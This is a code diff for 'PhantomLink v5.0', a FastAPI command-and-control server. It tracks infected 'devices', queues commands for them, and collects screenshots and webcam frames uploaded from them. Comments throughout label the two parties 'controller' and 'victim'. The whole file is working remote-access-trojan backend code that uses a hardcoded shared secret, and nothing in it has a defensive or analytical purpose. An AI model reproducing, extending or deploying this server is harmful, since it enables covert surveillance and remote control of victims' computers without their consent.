@@ -1,25 +1,25 @@
-# main.py | PhantomLink v4.0 | FastAPI | Render
+# main.py | PhantomLink v5.0 | FastAPI | Render
 # requirements.txt: fastapi uvicorn pydantic
 
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-import time, threading, json
+import time, threading
 
-app = FastAPI(title="PhantomLink", docs_url=None, redoc_url=None)
+app = FastAPI(title="PhantomLink v5", docs_url=None, redoc_url=None)
 app.add_middleware(CORSMiddleware,
     allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
 SECRET         = "phantomlink2025"
 DEVICE_TIMEOUT = 30
 
-devices     = {}   # did -> info
-commands    = {}   # did -> {action, data}
-screenshots = {}   # did -> b64
-cam_frames  = {}   # did -> b64
-data_store  = {}   # did -> [items]
-chat_msgs   = {}   # did -> [msgs]   controller->client
-chat_reply  = {}   # did -> [msgs]   client->controller
+devices     = {}
+commands    = {}
+screenshots = {}
+cam_frames  = {}
+data_store  = {}
+chat_c2v    = {}   # controller -> victim
+chat_v2c    = {}   # victim -> controller
 _lk = threading.Lock()
 
 def _auth(s):
@@ -34,7 +34,7 @@ class Send(BaseModel):
     secret:str; action:str; data:str=""; target:str="all"
 
 class SS(BaseModel):
-    secret:str; device_id:str; image:str
+    secret:str; device_id:str; image:str; w:int=1920; h:int=1080
 
 class CF(BaseModel):
     secret:str; device_id:str; image:str
@@ -46,7 +46,7 @@ class Chat(BaseModel):
     secret:str; device_id:str; msg:str; sender:str="controller"
 
 @app.get("/")
-def root(): return {"status":"PhantomLink v4.0 online"}
+def root(): return {"status":"PhantomLink v5.0 online"}
 
 @app.get("/ping")
 def ping(): return {"ok":True,"ts":time.time()}
@@ -57,7 +57,8 @@ def heartbeat(b:HB):
     with _lk:
         devices[b.device_id]={
             "name":b.username,"ip":b.ip,"version":b.version,
-            "hostname":b.hostname,"os":b.os_info,"last_seen":time.time()
+            "hostname":b.hostname,"os":b.os_info,"last_seen":time.time(),
+            "screen_w":1920,"screen_h":1080
         }
         if b.device_id not in commands:
             commands[b.device_id]={"action":"none","data":""}
@@ -82,24 +83,19 @@ def send(b:Send):
             commands[b.target]=cmd
     return {"ok":True}
 
-@app.get("/devices")
-def list_devices(secret:str):
-    _auth(secret)
-    now=time.time()
-    with _lk:
-        return {did:{**info,"online":(now-info["last_seen"])<DEVICE_TIMEOUT}
-                for did,info in devices.items()}
-
 @app.post("/screenshot")
 def upload_ss(b:SS):
     _auth(b.secret)
-    with _lk: screenshots[b.device_id]=b.image
+    with _lk:
+        screenshots[b.device_id]={"image":b.image,"w":b.w,"h":b.h,"ts":time.time()}
     return {"ok":True}
 
 @app.get("/screenshot")
 def get_ss(secret:str, device_id:str):
     _auth(secret)
-    with _lk: return {"image":screenshots.get(device_id)}
+    with _lk:
+        d=screenshots.get(device_id,{})
+    return {"image":d.get("image"),"w":d.get("w",1920),"h":d.get("h",1080)}
 
 @app.post("/camframe")
 def upload_cam(b:CF):
@@ -134,13 +130,13 @@ def post_chat(b:Chat):
     _auth(b.secret)
     with _lk:
         if b.sender=="controller":
-            bucket=chat_msgs.setdefault(b.device_id,[])
+            bucket=chat_c2v.setdefault(b.device_id,[])
             bucket.append({"msg":b.msg,"ts":time.time()})
-            if len(bucket)>50: chat_msgs[b.device_id]=bucket[-50:]
+            if len(bucket)>100: chat_c2v[b.device_id]=bucket[-100:]
         else:
-            bucket=chat_reply.setdefault(b.device_id,[])
+            bucket=chat_v2c.setdefault(b.device_id,[])
             bucket.append({"msg":b.msg,"ts":time.time()})
-            if len(bucket)>50: chat_reply[b.device_id]=bucket[-50:]
+            if len(bucket)>100: chat_v2c[b.device_id]=bucket[-100:]
     return {"ok":True}
 
 @app.get("/chat")
@@ -148,10 +144,16 @@ def get_chat(secret:str, device_id:str, sender:str="controller"):
     _auth(secret)
     with _lk:
         if sender=="controller":
-            msgs=list(chat_msgs.get(device_id,[]))
-            chat_msgs[device_id]=[]
+            msgs=list(chat_c2v.get(device_id,[])); chat_c2v[device_id]=[]
         else:
-            msgs=list(chat_reply.get(device_id,[]))
-            chat_reply[device_id]=[]
+            msgs=list(chat_v2c.get(device_id,[])); chat_v2c[device_id]=[]
     return {"msgs":msgs}
-    
+
+@app.get("/devices")
+def list_devices(secret:str):
+    _auth(secret)
+    now=time.time()
+    with _lk:
+        return {did:{**info,"online":(now-info["last_seen"])<DEVICE_TIMEOUT}
+                for did,info in devices.items()}
+            
